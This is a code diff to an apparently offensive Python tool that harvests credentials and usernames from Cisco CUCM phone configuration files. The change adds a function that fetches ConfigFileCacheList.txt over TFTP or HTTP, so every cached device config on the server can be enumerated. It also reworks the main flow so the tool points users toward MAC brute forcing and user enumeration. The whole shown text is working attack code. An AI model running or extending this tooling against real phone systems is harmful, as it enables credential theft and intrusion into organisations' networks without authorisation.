@@ -432,7 +432,29 @@ def get_cucm_name_from_phone(phone_ip):
     return cucm
 
 
-def get_config_names(cucm_host, hostnames=None):
+def get_cache_list(cucm_host, use_tftp=True):
+    if _TEST_MODE:
+        return ['SEPTEST00000000.cnf.xml']
+
+    filename = 'ConfigFileCacheList.txt'
+    dbg(f'Fetching {filename} from {cucm_host} (use_tftp={use_tftp})')
+    if use_tftp:
+        content = download_config_tftp(cucm_host, filename)
+        if content is None:
+            content = download_config_http(cucm_host, filename)
+    else:
+        content = download_config_http(cucm_host, filename)
+        if content is None:
+            content = download_config_tftp(cucm_host, filename)
+    if not content:
+        dbg(f'ConfigFileCacheList.txt not retrievable from {cucm_host}')
+        return []
+    entries = [line.strip() for line in content.splitlines() if line.strip()]
+    dbg(f'ConfigFileCacheList.txt: {len(entries)} entries')
+    return entries
+
+
+def get_config_names(cucm_host, hostnames=None, use_tftp=True):
     if _TEST_MODE:
         return ["SEPTEST00000000.cnf.xml"]
 
@@ -450,7 +472,15 @@ def get_config_names(cucm_host, hostnames=None):
             else:
                 filenames.append(f'{name}.cnf.xml')
         return filenames if filenames else []
-    return []
+
+    # No hostnames provided — fall back to ConfigFileCacheList.txt for full
+    # enumeration of every device config the CUCM TFTP service has cached.
+    if not cucm_host:
+        return []
+    entries = get_cache_list(cucm_host, use_tftp=use_tftp)
+    cnf_files = [e for e in entries if e.lower().endswith('.cnf.xml')]
+    dbg(f'Cache list yielded {len(cnf_files)} .cnf.xml entries')
+    return cnf_files
 
 
 def get_users_api(cucm_host, port=UDS_PORT, timeout=10, max_pages=10000):
@@ -1983,32 +2013,21 @@ def main():
         quit(0)
     elif args.host:
         CUCM_host = args.host
-        if not phones and not hostnames:
-            # Version info has already been printed via get_version above.
-            # No further action is possible without phones/hostnames/brute/userenum.
-            print('[*] No discovery flag supplied — to extract configs or users add one of:')
-            print('      -p <phone_ip>      discover hostnames/MACs from a phone')
-            print('      -b/--brute-mac     brute force MAC variations (also needs -p)')
-            print('      --userenum         enumerate users via the UDS API')
-            print('      -e <cidr>          enumerate phones from a subnet')
-            quit(0)
     else:
         print('You must enter either a phone IP address or the IP address of the CUCM server')
         quit(1)
-    file_names = get_config_names(CUCM_host)
-    if file_names is None:
-        if phones:
-            hostnames = [get_hostname_from_phone(phones[0])]
-            hostnames += get_phones_hostnames_from_reverse(phones[0]) or []
+    file_names = get_config_names(CUCM_host, hostnames=hostnames or None, use_tftp=use_tftp)
+    if not file_names and phones:
+        hostnames = [get_hostname_from_phone(phones[0])]
+        hostnames += get_phones_hostnames_from_reverse(phones[0]) or []
+        file_names = get_config_names(CUCM_host, hostnames=hostnames, use_tftp=use_tftp)
 
-        if hostnames == []:
-            file_names = get_config_names(CUCM_host)
-        else:
-            file_names = get_config_names(CUCM_host, hostnames=hostnames)
-
-    if file_names is None:
-        print('Unable to detect file names from CUCM')
+    if not file_names:
+        print('[-] No config file names discovered (ConfigFileCacheList.txt unreachable and no hostnames provided).')
+        print('[*] Try adding -p <phone_ip>, -b/--brute-mac, --userenum, or -e <cidr>.')
+        quit(1)
     else:
+        print(f'[+] Discovered {len(file_names)} config file name(s) to inspect')
         # Results are collected in all_credentials and all_usernames below
         all_credentials = []
         all_usernames = []
